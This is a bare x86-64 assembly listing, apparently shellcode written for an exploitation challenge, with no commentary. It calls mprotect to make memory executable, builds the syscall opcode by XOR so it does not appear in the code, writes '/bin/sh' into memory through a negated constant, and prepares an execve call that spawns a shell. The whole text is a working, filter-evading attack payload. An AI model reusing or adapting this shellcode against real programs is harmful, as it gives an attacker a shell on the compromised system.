
[bits 64]

mov     rdx, 7          
mov     rsi, 0x100      
mov     rdi, 0x69420000
mov     rax, 0x4010F0
call    rax              ;mprotect
mov     rcx, 0x6942004b
mov     byte [rcx], 190
xor     byte [rcx], 177
mov     rcx, 0x6942004c
mov     byte [rcx], 190
xor     byte [rcx], 187
xor     eax, eax
mov     rbx, 0xFF978CD091969DD1
neg     rbx
mov     rdi, 0x69420066
mov     qword [rdi], rbx
xor     rsi, rsi
xor     rdx, rdx
mov     al, 0x3b
